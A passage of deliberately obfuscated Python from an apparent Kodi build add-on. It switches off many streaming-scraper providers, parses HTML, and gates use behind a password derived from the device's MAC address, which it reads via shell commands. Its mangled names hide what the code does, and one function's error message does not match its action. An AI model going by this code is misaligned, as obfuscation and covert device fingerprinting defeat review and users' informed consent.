		O000O00000OOO000O .setSetting ('all_t','0')#line:1210
		O000O00000OOO000O .setSetting ('rd_menu_enable','false')#line:1211
		O000O00000OOO000O .setSetting ('magnet_bay','false')#line:1212
		O000O00000OOO000O .setSetting ('magnet_extra','false')#line:1213
		O000O00000OOO000O .setSetting ('rd_only','false')#line:1214
		O000O00000OOO000O .setSetting ('ftp','false')#line:1216
		O000O00000OOO000O .setSetting ('fp','false')#line:1217
		O000O00000OOO000O .setSetting ('filter_fp','false')#line:1218
		O000O00000OOO000O .setSetting ('fp_size_en','false')#line:1219
		O000O00000OOO000O .setSetting ('afdah','false')#line:1220
		O000O00000OOO000O .setSetting ('ap2s','false')#line:1221
		O000O00000OOO000O .setSetting ('cin','false')#line:1222
		O000O00000OOO000O .setSetting ('clv','false')#line:1223
		O000O00000OOO000O .setSetting ('cmv','false')#line:1224
		O000O00000OOO000O .setSetting ('dl20','false')#line:1225
		O000O00000OOO000O .setSetting ('esc','false')#line:1226
		O000O00000OOO000O .setSetting ('extra','false')#line:1227
		O000O00000OOO000O .setSetting ('film','false')#line:1228
		O000O00000OOO000O .setSetting ('fre','false')#line:1229
		O000O00000OOO000O .setSetting ('fxy','false')#line:1230
		O000O00000OOO000O .setSetting ('genv','false')#line:1231
		O000O00000OOO000O .setSetting ('getgo','false')#line:1232
		O000O00000OOO000O .setSetting ('gold','false')#line:1233
		O000O00000OOO000O .setSetting ('gona','false')#line:1234
		O000O00000OOO000O .setSetting ('hdmm','false')#line:1235
		O000O00000OOO000O .setSetting ('hdt','false')#line:1236
		O000O00000OOO000O .setSetting ('icy','false')#line:1237
		O000O00000OOO000O .setSetting ('ind','false')#line:1238
		O000O00000OOO000O .setSetting ('iwi','false')#line:1239
		O000O00000OOO000O .setSetting ('jen_free','false')#line:1240
		O000O00000OOO000O .setSetting ('kiss','false')#line:1241
		O000O00000OOO000O .setSetting ('lavin','false')#line:1242
		O000O00000OOO000O .setSetting ('los','false')#line:1243
		O000O00000OOO000O .setSetting ('m4u','false')#line:1244
		O000O00000OOO000O .setSetting ('mesh','false')#line:1245
		O000O00000OOO000O .setSetting ('mf','false')#line:1246
		O000O00000OOO000O .setSetting ('mkvc','false')#line:1247
		O000O00000OOO000O .setSetting ('mjy','false')#line:1248
		O000O00000OOO000O .setSetting ('hdonline','false')#line:1249
		O000O00000OOO000O .setSetting ('moviex','false')#line:1250
		O000O00000OOO000O .setSetting ('mpr','false')#line:1251
		O000O00000OOO000O .setSetting ('mvg','false')#line:1252
		O000O00000OOO000O .setSetting ('mvl','false')#line:1253
		O000O00000OOO000O .setSetting ('mvs','false')#line:1254
		O000O00000OOO000O .setSetting ('myeg','false')#line:1255
		O000O00000OOO000O .setSetting ('ninja','false')#line:1256
		O000O00000OOO000O .setSetting ('odb','false')#line:1257
		O000O00000OOO000O .setSetting ('ophd','false')#line:1258
		O000O00000OOO000O .setSetting ('pks','false')#line:1259
		O000O00000OOO000O .setSetting ('prf','false')#line:1260
		O000O00000OOO000O .setSetting ('put18','false')#line:1261
		O000O00000OOO000O .setSetting ('req','false')#line:1262
		O000O00000OOO000O .setSetting ('rftv','false')#line:1263
		O000O00000OOO000O .setSetting ('rltv','false')#line:1264
		O000O00000OOO000O .setSetting ('sc','false')#line:1265
		O000O00000OOO000O .setSetting ('seehd','false')#line:1266
		O000O00000OOO000O .setSetting ('showbox','false')#line:1267
		O000O00000OOO000O .setSetting ('shuid','false')#line:1268
		O000O00000OOO000O .setSetting ('sil_gh','false')#line:1269
		O000O00000OOO000O .setSetting ('spv','false')#line:1270
		O000O00000OOO000O .setSetting ('subs','false')#line:1271
		O000O00000OOO000O .setSetting ('tvs','false')#line:1272
		O000O00000OOO000O .setSetting ('tw','false')#line:1273
		O000O00000OOO000O .setSetting ('upto','false')#line:1274
		O000O00000OOO000O .setSetting ('vel','false')#line:1275
		O000O00000OOO000O .setSetting ('vex','false')#line:1276
		O000O00000OOO000O .setSetting ('vidc','false')#line:1277
		O000O00000OOO000O .setSetting ('w4hd','false')#line:1278
		O000O00000OOO000O .setSetting ('wav','false')#line:1279
		O000O00000OOO000O .setSetting ('wf','false')#line:1280
		O000O00000OOO000O .setSetting ('wse','false')#line:1281
		O000O00000OOO000O .setSetting ('wss','false')#line:1282
		O000O00000OOO000O .setSetting ('wsse','false')#line:1283
		O000O00000OOO000O =xbmcaddon .Addon ('plugin.video.speedmax')#line:1284
		O000O00000OOO000O .setSetting ('debrid.only','true')#line:1285
		O000O00000OOO000O .setSetting ('hosts.captcha','false')#line:1286
		O000O00000OOO000O =xbmcaddon .Addon ('script.module.civitasscrapers')#line:1287
		O000O00000OOO000O .setSetting ('provider.123moviehd','false')#line:1288
		O000O00000OOO000O .setSetting ('provider.300mbdownload','false')#line:1289
		O000O00000OOO000O .setSetting ('provider.alltube','false')#line:1290
		O000O00000OOO000O .setSetting ('provider.allucde','false')#line:1291
		O000O00000OOO000O .setSetting ('provider.animebase','false')#line:1292
		O000O00000OOO000O .setSetting ('provider.animeloads','false')#line:1293
		O000O00000OOO000O .setSetting ('provider.animetoon','false')#line:1294
		O000O00000OOO000O .setSetting ('provider.bnwmovies','false')#line:1295
		O000O00000OOO000O .setSetting ('provider.boxfilm','false')#line:1296
		O000O00000OOO000O .setSetting ('provider.bs','false')#line:1297
		O000O00000OOO000O .setSetting ('provider.cartoonhd','false')#line:1298
		O000O00000OOO000O .setSetting ('provider.cdahd','false')#line:1299
		O000O00000OOO000O .setSetting ('provider.cdax','false')#line:1300
		O000O00000OOO000O .setSetting ('provider.cine','false')#line:1301
		O000O00000OOO000O .setSetting ('provider.cinenator','false')#line:1302
		O000O00000OOO000O .setSetting ('provider.cmovieshdbz','false')#line:1303
		O000O00000OOO000O .setSetting ('provider.coolmoviezone','false')#line:1304
		O000O00000OOO000O .setSetting ('provider.ddl','false')#line:1305
		O000O00000OOO000O .setSetting ('provider.deepmovie','false')#line:1306
		O000O00000OOO000O .setSetting ('provider.ekinomaniak','false')#line:1307
		O000O00000OOO000O .setSetting ('provider.ekinotv','false')#line:1308
		O000O00000OOO000O .setSetting ('provider.filiser','false')#line:1309
		O000O00000OOO000O .setSetting ('provider.filmpalast','false')#line:1310
		O000O00000OOO000O .setSetting ('provider.filmwebbooster','false')#line:1311
		O000O00000OOO000O .setSetting ('provider.filmxy','false')#line:1312
		O000O00000OOO000O .setSetting ('provider.fmovies','false')#line:1313
		O000O00000OOO000O .setSetting ('provider.foxx','false')#line:1314
		O000O00000OOO000O .setSetting ('provider.freefmovies','false')#line:1315
		O000O00000OOO000O .setSetting ('provider.freeputlocker','false')#line:1316
		O000O00000OOO000O .setSetting ('provider.furk','false')#line:1317
		O000O00000OOO000O .setSetting ('provider.gamatotv','false')#line:1318
		O000O00000OOO000O .setSetting ('provider.gogoanime','false')#line:1319
		O000O00000OOO000O .setSetting ('provider.gowatchseries','false')#line:1320
		O000O00000OOO000O .setSetting ('provider.hackimdb','false')#line:1321
		O000O00000OOO000O .setSetting ('provider.hdfilme','false')#line:1322
		O000O00000OOO000O .setSetting ('provider.hdmto','false')#line:1323
		O000O00000OOO000O .setSetting ('provider.hdpopcorns','false')#line:1324
		O000O00000OOO000O .setSetting ('provider.hdstreams','false')#line:1325
		O000O00000OOO000O .setSetting ('provider.horrorkino','false')#line:1327
		O000O00000OOO000O .setSetting ('provider.iitv','false')#line:1328
		O000O00000OOO000O .setSetting ('provider.iload','false')#line:1329
		O000O00000OOO000O .setSetting ('provider.iwaatch','false')#line:1330
		O000O00000OOO000O .setSetting ('provider.kinodogs','false')#line:1331
		O000O00000OOO000O .setSetting ('provider.kinoking','false')#line:1332
		O000O00000OOO000O .setSetting ('provider.kinow','false')#line:1333
		O000O00000OOO000O .setSetting ('provider.kinox','false')#line:1334
		O000O00000OOO000O .setSetting ('provider.lichtspielhaus','false')#line:1335
		O000O00000OOO000O .setSetting ('provider.liomenoi','false')#line:1336
		O000O00000OOO000O .setSetting ('provider.magnetdl','false')#line:1339
		O000O00000OOO000O .setSetting ('provider.megapelistv','false')#line:1340
		O000O00000OOO000O .setSetting ('provider.movie2k-ac','false')#line:1341
		O000O00000OOO000O .setSetting ('provider.movie2k-ag','false')#line:1342
		O000O00000OOO000O .setSetting ('provider.movie2z','false')#line:1343
		O000O00000OOO000O .setSetting ('provider.movie4k','false')#line:1344
		O000O00000OOO000O .setSetting ('provider.movie4kis','false')#line:1345
		O000O00000OOO000O .setSetting ('provider.movieneo','false')#line:1346
		O000O00000OOO000O .setSetting ('provider.moviesever','false')#line:1347
		O000O00000OOO000O .setSetting ('provider.movietown','false')#line:1348
		O000O00000OOO000O .setSetting ('provider.mvrls','false')#line:1350
		O000O00000OOO000O .setSetting ('provider.netzkino','false')#line:1351
		O000O00000OOO000O .setSetting ('provider.odb','false')#line:1352
		O000O00000OOO000O .setSetting ('provider.openkatalog','false')#line:1353
		O000O00000OOO000O .setSetting ('provider.ororo','false')#line:1354
		O000O00000OOO000O .setSetting ('provider.paczamy','false')#line:1355
		O000O00000OOO000O .setSetting ('provider.peliculasdk','false')#line:1356
		O000O00000OOO000O .setSetting ('provider.pelisplustv','false')#line:1357
		O000O00000OOO000O .setSetting ('provider.pepecine','false')#line:1358
		O000O00000OOO000O .setSetting ('provider.primewire','false')#line:1359
		O000O00000OOO000O .setSetting ('provider.projectfreetv','false')#line:1360
		O000O00000OOO000O .setSetting ('provider.proxer','false')#line:1361
		O000O00000OOO000O .setSetting ('provider.pureanime','false')#line:1362
		O000O00000OOO000O .setSetting ('provider.putlocker','false')#line:1363
		O000O00000OOO000O .setSetting ('provider.putlockerfree','false')#line:1364
		O000O00000OOO000O .setSetting ('provider.reddit','false')#line:1365
		O000O00000OOO000O .setSetting ('provider.cartoonwire','false')#line:1366
		O000O00000OOO000O .setSetting ('provider.seehd','false')#line:1367
		O000O00000OOO000O .setSetting ('provider.segos','false')#line:1368
		O000O00000OOO000O .setSetting ('provider.serienstream','false')#line:1369
		O000O00000OOO000O .setSetting ('provider.series9','false')#line:1370
		O000O00000OOO000O .setSetting ('provider.seriesever','false')#line:1371
		O000O00000OOO000O .setSetting ('provider.seriesonline','false')#line:1372
		O000O00000OOO000O .setSetting ('provider.seriespapaya','false')#line:1373
		O000O00000OOO000O .setSetting ('provider.sezonlukdizi','false')#line:1374
		O000O00000OOO000O .setSetting ('provider.solarmovie','false')#line:1375
		O000O00000OOO000O .setSetting ('provider.solarmoviez','false')#line:1376
		O000O00000OOO000O .setSetting ('provider.stream-to','false')#line:1377
		O000O00000OOO000O .setSetting ('provider.streamdream','false')#line:1378
		O000O00000OOO000O .setSetting ('provider.streamflix','false')#line:1379
		O000O00000OOO000O .setSetting ('provider.streamit','false')#line:1380
		O000O00000OOO000O .setSetting ('provider.swatchseries','false')#line:1381
		O000O00000OOO000O .setSetting ('provider.szukajkatv','false')#line:1382
		O000O00000OOO000O .setSetting ('provider.tainiesonline','false')#line:1383
		O000O00000OOO000O .setSetting ('provider.tainiomania','false')#line:1384
		O000O00000OOO000O .setSetting ('provider.tata','false')#line:1387
		O000O00000OOO000O .setSetting ('provider.trt','false')#line:1388
		O000O00000OOO000O .setSetting ('provider.tvbox','false')#line:1389
		O000O00000OOO000O .setSetting ('provider.ultrahd','false')#line:1390
		O000O00000OOO000O .setSetting ('provider.video4k','false')#line:1391
		O000O00000OOO000O .setSetting ('provider.vidics','false')#line:1392
		O000O00000OOO000O .setSetting ('provider.view4u','false')#line:1393
		O000O00000OOO000O .setSetting ('provider.watchseries','false')#line:1394
		O000O00000OOO000O .setSetting ('provider.xrysoi','false')#line:1395
		O000O00000OOO000O .setSetting ('provider.library','false')#line:1396
def fixfont ():#line:1399
	O0OO0O0000OO000O0 =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.GetSettings","id":1}')#line:1400
	O0OOO0OO0OOOOOO00 =json .loads (O0OO0O0000OO000O0 );#line:1402
	OOO0O0000O0OOOO00 =O0OOO0OO0OOOOOO00 ["result"]["settings"]#line:1403
	OOOOOO00OO0OOOO0O =[OOO000OO00OO000OO for OOO000OO00OO000OO in OOO0O0000O0OOOO00 if OOO000OO00OO000OO ["id"]=="audiooutput.audiodevice"][0 ]#line:1405
	O0OO0O00O000O0OOO =OOOOOO00OO0OOOO0O ["options"];#line:1406
	OO0OO00O000000OO0 =OOOOOO00OO0OOOO0O ["value"];#line:1407
	O0OOO0OOOO0OO00O0 =[O0OO00OOOOOOO00OO for (O0OO00OOOOOOO00OO ,OOOOOO0O0OO0OO00O )in enumerate (O0OO0O00O000O0OOO )if OOOOOO0O0OO0OO00O ["value"]==OO0OO00O000000OO0 ][0 ];#line:1409
	OO0O00O000O0O0O00 =(O0OOO0OOOO0OO00O0 +1 )%len (O0OO0O00O000O0OOO )#line:1411
	OOO00O000O0OO0OO0 =O0OO0O00O000O0OOO [OO0O00O000O0O0O00 ]["value"]#line:1413
	OOOOO0000OO0OO00O =O0OO0O00O000O0OOO [OO0O00O000O0O0O00 ]["label"]#line:1414
	O0OO0O0000OOO0OOO =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","params":{"setting":"subtitles.height","value":40},"id":1}')#line:1416
	try :#line:1418
		O0OO00OO0OO0O000O =json .loads (O0OO0O0000OOO0OOO );#line:1419
		if O0OO00OO0OO0O000O ["result"]!=True :#line:1421
			raise Exception #line:1422
	except :#line:1423
		sys .stderr .write ("Error switching audio output device")#line:1424
		raise Exception #line:1425
def parseDOM2 (OO0O000OOO00OO0O0 ,name =u"",attrs ={},ret =False ):#line:1426
	if isinstance (OO0O000OOO00OO0O0 ,str ):#line:1429
		try :#line:1430
			OO0O000OOO00OO0O0 =[OO0O000OOO00OO0O0 .decode ("utf-8")]#line:1431
		except :#line:1432
			OO0O000OOO00OO0O0 =[OO0O000OOO00OO0O0 ]#line:1433
	elif isinstance (OO0O000OOO00OO0O0 ,unicode ):#line:1434
		OO0O000OOO00OO0O0 =[OO0O000OOO00OO0O0 ]#line:1435
	elif not isinstance (OO0O000OOO00OO0O0 ,list ):#line:1436
		return u""#line:1437
	if not name .strip ():#line:1439
		return u""#line:1440
	O0000O00OOO0OOO0O =[]#line:1442
	for OO000O0O00000OO00 in OO0O000OOO00OO0O0 :#line:1443
		OO0OOO00000O0O0O0 =re .compile ('(<[^>]*?\n[^>]*?>)').findall (OO000O0O00000OO00 )#line:1444
		for O0O00O0O00OOO0O00 in OO0OOO00000O0O0O0 :#line:1445
			OO000O0O00000OO00 =OO000O0O00000OO00 .replace (O0O00O0O00OOO0O00 ,O0O00O0O00OOO0O00 .replace ("\n"," "))#line:1446
		O0OO0000O0000O000 =[]#line:1448
		for O000O00000O0000OO in attrs :#line:1449
			O00OO0O00O000O0OO =re .compile ('(<'+name +'[^>]*?(?:'+O000O00000O0000OO +'=[\'"]'+attrs [O000O00000O0000OO ]+'[\'"].*?>))',re .M |re .S ).findall (OO000O0O00000OO00 )#line:1450
			if len (O00OO0O00O000O0OO )==0 and attrs [O000O00000O0000OO ].find (" ")==-1 :#line:1451
				O00OO0O00O000O0OO =re .compile ('(<'+name +'[^>]*?(?:'+O000O00000O0000OO +'='+attrs [O000O00000O0000OO ]+'.*?>))',re .M |re .S ).findall (OO000O0O00000OO00 )#line:1452
			if len (O0OO0000O0000O000 )==0 :#line:1454
				O0OO0000O0000O000 =O00OO0O00O000O0OO #line:1455
				O00OO0O00O000O0OO =[]#line:1456
			else :#line:1457
				OO0O00O0OOOOO0O0O =range (len (O0OO0000O0000O000 ))#line:1458
				OO0O00O0OOOOO0O0O .reverse ()#line:1459
				for O0O0O00OOO0OOO00O in OO0O00O0OOOOO0O0O :#line:1460
					if not O0OO0000O0000O000 [O0O0O00OOO0OOO00O ]in O00OO0O00O000O0OO :#line:1461
						del (O0OO0000O0000O000 [O0O0O00OOO0OOO00O ])#line:1462
		if len (O0OO0000O0000O000 )==0 and attrs =={}:#line:1464
			O0OO0000O0000O000 =re .compile ('(<'+name +'>)',re .M |re .S ).findall (OO000O0O00000OO00 )#line:1465
			if len (O0OO0000O0000O000 )==0 :#line:1466
				O0OO0000O0000O000 =re .compile ('(<'+name +' .*?>)',re .M |re .S ).findall (OO000O0O00000OO00 )#line:1467
		if isinstance (ret ,str ):#line:1469
			O00OO0O00O000O0OO =[]#line:1470
			for O0O00O0O00OOO0O00 in O0OO0000O0000O000 :#line:1471
				O0OO000O000OOOO00 =re .compile ('<'+name +'.*?'+ret +'=([\'"].[^>]*?[\'"])>',re .M |re .S ).findall (O0O00O0O00OOO0O00 )#line:1472
				if len (O0OO000O000OOOO00 )==0 :#line:1473
					O0OO000O000OOOO00 =re .compile ('<'+name +'.*?'+ret +'=(.[^>]*?)>',re .M |re .S ).findall (O0O00O0O00OOO0O00 )#line:1474
				for OO00OO00OO0O00OOO in O0OO000O000OOOO00 :#line:1475
					OO00O000O000O000O =OO00OO00OO0O00OOO [0 ]#line:1476
					if OO00O000O000O000O in "'\"":#line:1477
						if OO00OO00OO0O00OOO .find ('='+OO00O000O000O000O ,OO00OO00OO0O00OOO .find (OO00O000O000O000O ,1 ))>-1 :#line:1478
							OO00OO00OO0O00OOO =OO00OO00OO0O00OOO [:OO00OO00OO0O00OOO .find ('='+OO00O000O000O000O ,OO00OO00OO0O00OOO .find (OO00O000O000O000O ,1 ))]#line:1479
						if OO00OO00OO0O00OOO .rfind (OO00O000O000O000O ,1 )>-1 :#line:1481
							OO00OO00OO0O00OOO =OO00OO00OO0O00OOO [1 :OO00OO00OO0O00OOO .rfind (OO00O000O000O000O )]#line:1482
					else :#line:1483
						if OO00OO00OO0O00OOO .find (" ")>0 :#line:1484
							OO00OO00OO0O00OOO =OO00OO00OO0O00OOO [:OO00OO00OO0O00OOO .find (" ")]#line:1485
						elif OO00OO00OO0O00OOO .find ("/")>0 :#line:1486
							OO00OO00OO0O00OOO =OO00OO00OO0O00OOO [:OO00OO00OO0O00OOO .find ("/")]#line:1487
						elif OO00OO00OO0O00OOO .find (">")>0 :#line:1488
							OO00OO00OO0O00OOO =OO00OO00OO0O00OOO [:OO00OO00OO0O00OOO .find (">")]#line:1489
					O00OO0O00O000O0OO .append (OO00OO00OO0O00OOO .strip ())#line:1491
			O0OO0000O0000O000 =O00OO0O00O000O0OO #line:1492
		else :#line:1493
			O00OO0O00O000O0OO =[]#line:1494
			for O0O00O0O00OOO0O00 in O0OO0000O0000O000 :#line:1495
				OOOO00O00OOOO0000 =u"</"+name #line:1496
				O0000OO00O00000OO =OO000O0O00000OO00 .find (O0O00O0O00OOO0O00 )#line:1498
				O0OOOOO0OOO00O00O =OO000O0O00000OO00 .find (OOOO00O00OOOO0000 ,O0000OO00O00000OO )#line:1499
				OO00000OOO000OO00 =OO000O0O00000OO00 .find ("<"+name ,O0000OO00O00000OO +1 )#line:1500
				while OO00000OOO000OO00 <O0OOOOO0OOO00O00O and OO00000OOO000OO00 !=-1 :#line:1502
					OOO00OOO0O0O00O00 =OO000O0O00000OO00 .find (OOOO00O00OOOO0000 ,O0OOOOO0OOO00O00O +len (OOOO00O00OOOO0000 ))#line:1503
					if OOO00OOO0O0O00O00 !=-1 :#line:1504
						O0OOOOO0OOO00O00O =OOO00OOO0O0O00O00 #line:1505
					OO00000OOO000OO00 =OO000O0O00000OO00 .find ("<"+name ,OO00000OOO000OO00 +1 )#line:1506
				if O0000OO00O00000OO ==-1 and O0OOOOO0OOO00O00O ==-1 :#line:1508
					OOO0O0OOO00O0OOO0 =u""#line:1509
				elif O0000OO00O00000OO >-1 and O0OOOOO0OOO00O00O >-1 :#line:1510
					OOO0O0OOO00O0OOO0 =OO000O0O00000OO00 [O0000OO00O00000OO +len (O0O00O0O00OOO0O00 ):O0OOOOO0OOO00O00O ]#line:1511
				elif O0OOOOO0OOO00O00O >-1 :#line:1512
					OOO0O0OOO00O0OOO0 =OO000O0O00000OO00 [:O0OOOOO0OOO00O00O ]#line:1513
				elif O0000OO00O00000OO >-1 :#line:1514
					OOO0O0OOO00O0OOO0 =OO000O0O00000OO00 [O0000OO00O00000OO +len (O0O00O0O00OOO0O00 ):]#line:1515
				if ret :#line:1517
					OOOO00O00OOOO0000 =OO000O0O00000OO00 [O0OOOOO0OOO00O00O :OO000O0O00000OO00 .find (">",OO000O0O00000OO00 .find (OOOO00O00OOOO0000 ))+1 ]#line:1518
					OOO0O0OOO00O0OOO0 =O0O00O0O00OOO0O00 +OOO0O0OOO00O0OOO0 +OOOO00O00OOOO0000 #line:1519
				OO000O0O00000OO00 =OO000O0O00000OO00 [OO000O0O00000OO00 .find (OOO0O0OOO00O0OOO0 ,OO000O0O00000OO00 .find (O0O00O0O00OOO0O00 ))+len (OOO0O0OOO00O0OOO0 ):]#line:1521
				O00OO0O00O000O0OO .append (OOO0O0OOO00O0OOO0 )#line:1522
			O0OO0000O0000O000 =O00OO0O00O000O0OO #line:1523
		O0000O00OOO0OOO0O +=O0OO0000O0000O000 #line:1524
	return O0000O00OOO0OOO0O #line:1526
def addItem (OO0OOOO00OO000OO0 ,O000OO000OOO00OOO ,OOOO000000000O0OO ,OOOO0000000OOOO00 ,O0OOOO00O0OO0O000 ,description =None ):#line:1528
	if description ==None :description =''#line:1529
	description ='[COLOR white]'+description +'[/COLOR]'#line:1530
	OOOOOO0OO0OOOOOO0 =sys .argv [0 ]+"?url="+urllib .quote_plus (O000OO000OOO00OOO )+"&mode="+str (OOOO000000000O0OO )+"&name="+urllib .quote_plus (OO0OOOO00OO000OO0 )+"&iconimage="+urllib .quote_plus (OOOO0000000OOOO00 )+"&fanart="+urllib .quote_plus (O0OOOO00O0OO0O000 )#line:1531
	O0O000O0OOOOO00OO =True #line:1532
	O0O0O00OO0OO00OO0 =xbmcgui .ListItem (OO0OOOO00OO000OO0 ,iconImage =OOOO0000000OOOO00 ,thumbnailImage =OOOO0000000OOOO00 )#line:1533
	O0O0O00OO0OO00OO0 .setInfo (type ="Video",infoLabels ={"Title":OO0OOOO00OO000OO0 ,"Plot":description })#line:1534
	O0O0O00OO0OO00OO0 .setProperty ("fanart_Image",O0OOOO00O0OO0O000 )#line:1535
	O0O0O00OO0OO00OO0 .setProperty ("icon_Image",OOOO0000000OOOO00 )#line:1536
	O0O000O0OOOOO00OO =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OOOOOO0OO0OOOOOO0 ,listitem =O0O0O00OO0OO00OO0 ,isFolder =False )#line:1537
	return O0O000O0OOOOO00OO #line:1538
def get_params ():#line:1540
		O0OOOO0O00OOO00OO =[]#line:1541
		OO0O0000OOO0000OO =sys .argv [2 ]#line:1542
		if len (OO0O0000OOO0000OO )>=2 :#line:1543
				O000OO0O00O0OOOOO =sys .argv [2 ]#line:1544
				OOO0OOOOO00OOO000 =O000OO0O00O0OOOOO .replace ('?','')#line:1545
				if (O000OO0O00O0OOOOO [len (O000OO0O00O0OOOOO )-1 ]=='/'):#line:1546
						O000OO0O00O0OOOOO =O000OO0O00O0OOOOO [0 :len (O000OO0O00O0OOOOO )-2 ]#line:1547
				O0OO0OO00OOO00O00 =OOO0OOOOO00OOO000 .split ('&')#line:1548
				O0OOOO0O00OOO00OO ={}#line:1549
				for O0OO0OOO0OO0OO00O in range (len (O0OO0OO00OOO00O00 )):#line:1550
						O00O00O0O00OOO0OO ={}#line:1551
						O00O00O0O00OOO0OO =O0OO0OO00OOO00O00 [O0OO0OOO0OO0OO00O ].split ('=')#line:1552
						if (len (O00O00O0O00OOO0OO ))==2 :#line:1553
								O0OOOO0O00OOO00OO [O00O00O0O00OOO0OO [0 ]]=O00O00O0O00OOO0OO [1 ]#line:1554
		return O0OOOO0O00OOO00OO #line:1556
def decode (OO0OOO0O00O0O00O0 ,OOOO000OOO0OOO0OO ):#line:1561
    import base64 #line:1562
    OOO0000OO0OO0OO00 =[]#line:1563
    if (len (OO0OOO0O00O0O00O0 ))!=4 :#line:1565
     return 10 #line:1566
    OOOO000OOO0OOO0OO =base64 .urlsafe_b64decode (OOOO000OOO0OOO0OO )#line:1567
    for OO00O0O0O00O0O00O in range (len (OOOO000OOO0OOO0OO )):#line:1569
        O0O00000O0OO0O0OO =OO0OOO0O00O0O00O0 [OO00O0O0O00O0O00O %len (OO0OOO0O00O0O00O0 )]#line:1570
        O0OOOOOO000000OOO =chr ((256 +ord (OOOO000OOO0OOO0OO [OO00O0O0O00O0O00O ])-ord (O0O00000O0OO0O0OO ))%256 )#line:1571
        OOO0000OO0OO0OO00 .append (O0OOOOOO000000OOO )#line:1572
    return "".join (OOO0000OO0OO0OO00 )#line:1573
def tmdb_list (OO0O0O00OO000OOO0 ):#line:1574
    OO0OO0OO0OO0O0O00 =decode ("7643",OO0O0O00OO000OOO0 )#line:1577
    return int (OO0OO0OO0OO0O0O00 )#line:1580
def u_list (OOOOOOOO00OOO00O0 ):#line:1581
    from math import sqrt #line:1583
    O0000O0OOO0O0OOOO =tmdb_list (TMDB_NEW_API )#line:1584
    O000O0O00OOOO0O0O =str ((getHwAddr ('eth0'))*O0000O0OOO0O0OOOO )#line:1586
    OOO000O0OO0O0O0OO =int (O000O0O00OOOO0O0O [1 ]+O000O0O00OOOO0O0O [2 ]+O000O0O00OOOO0O0O [5 ]+O000O0O00OOOO0O0O [7 ])#line:1587
    OO000000OO00O0OO0 =(ADDON .getSetting ("pass"))#line:1589
    O0OO0O0OOOOOOOO0O =(str (round (sqrt ((OOO000O0OO0O0O0OO *700 )+50 )+50 ,4 ))[-4 :]).replace ('.','')#line:1594
    if '.'in O0OO0O0OOOOOOOO0O :#line:1595
     O0OO0O0OOOOOOOO0O =(str (round (sqrt ((OOO000O0OO0O0O0OO *700 )+50 )+50 ,4 ))[-5 :]).replace ('.','')#line:1596
    if OO000000OO00O0OO0 ==O0OO0O0OOOOOOOO0O :#line:1598
      OO000O0OO0000000O =OOOOOOOO00OOO00O0 #line:1600
    else :#line:1602
       if STARTP2 ()and STARTP ()=='ok':#line:1603
         return OOOOOOOO00OOO00O0 #line:1606
       OO000O0OO0000000O ='https://www.google.com/search?&q=don%27t+take+my+money&oq=dont+take+my+moniey'#line:1607
       xbmcgui .Dialog ().ok ('הקוד שלך',' סיסמה שגויה')#line:1608
       sys .exit ()#line:1609
    return OO000O0OO0000000O #line:1610
def disply_hwr ():#line:1612
   try :#line:1613
    OOO0OO00O0OOO000O =tmdb_list (TMDB_NEW_API )#line:1614
    O000OOOO0O000OO0O =str ((getHwAddr ('eth0'))*OOO0OO00O0OOO000O )#line:1615
    O00000O0OOO000OO0 =(O000OOOO0O000OO0O [1 ]+O000OOOO0O000OO0O [2 ]+O000OOOO0O000OO0O [5 ]+O000OOOO0O000OO0O [7 ])#line:1622
    O000O0O00O0000OOO =(ADDON .getSetting ("action"))#line:1623
    wiz .setS ('action',str (O00000O0OOO000OO0 ))#line:1625
   except :pass #line:1626
def disply_hwr2 ():#line:1627
   try :#line:1628
    O0OOOOO0OOOOOOO00 =tmdb_list (TMDB_NEW_API )#line:1629
    OO0O000OO00OOOO0O =str ((getHwAddr ('eth0'))*O0OOOOO0OOOOOOO00 )#line:1631
    O0OO0OOO0OO00OOO0 =(OO0O000OO00OOOO0O [1 ]+OO0O000OO00OOOO0O [2 ]+OO0O000OO00OOOO0O [5 ]+OO0O000OO00OOOO0O [7 ])#line:1640
    OO0OO000O0OOOO0OO =(ADDON .getSetting ("action"))#line:1641
    xbmcgui .Dialog ().ok ("[COLOR yellow] לשלוח את הקוד למנהלים [/COLOR]",O0OO0OOO0OO00OOO0 )#line:1644
   except :pass #line:1645
def getHwAddr (O0OOO00O0O0000OO0 ):#line:1647
   import subprocess ,time #line:1648
   O00OOOOOOOO0OO000 ='windows'#line:1649
   if xbmc .getCondVisibility ('system.platform.android'):#line:1650
       O00OOOOOOOO0OO000 ='android'#line:1651
   if xbmc .getCondVisibility ('system.platform.android'):#line:1652
     OOOOO0000O0OOO0OO =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()#line:1653
     O00O0OOO0000O0OO0 =re .compile ('link/ether (.+?) brd').findall (str (OOOOO0000O0OOO0OO ))#line:1655
     O0OOOOOOO0OO00O0O =0 #line:1656
     for OO000OO00OOOO000O in O00O0OOO0000O0OO0 :#line:1657
      if O00O0OOO0000O0OO0 !='00:00:00:00:00:00':#line:1658
          OOO00OOOO0OOO00O0 =OO000OO00OOOO000O #line:1659
          O0OOOOOOO0OO00O0O =O0OOOOOOO0OO00O0O +int (OOO00OOOO0OOO00O0 .replace (':',''),16 )#line:1660
   elif xbmc .getCondVisibility ('system.platform.windows'):#line:1662
       O0OOO0O0OOOO0O0O0 =0 #line:1663
       O0OOOOOOO0OO00O0O =0 #line:1664
       OOOO000O000000000 =[]#line:1665
       OOOO0000OO0O0OO0O =os .popen ("getmac").read ()#line:1666
       OOOO0000OO0O0OO0O =OOOO0000OO0O0OO0O .split ("\n")#line:1667
       for OOOO0OOOO00O0OOO0 in OOOO0000OO0O0OO0O :#line:1669
            O0O0000OO00O0O00O =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',OOOO0OOOO00O0OOO0 ,re .I )#line:1670
            if O0O0000OO00O0O00O :#line:1671
                O00O0OOO0000O0OO0 =O0O0000OO00O0O00O .group ().replace ('-',':')#line:1672
                OOOO000O000000000 .append (O00O0OOO0000O0OO0 )#line:1673
                O0OOOOOOO0OO00O0O =O0OOOOOOO0OO00O0O +int (O00O0OOO0000O0OO0 .replace (':',''),16 )#line:1676
   else :#line:1678
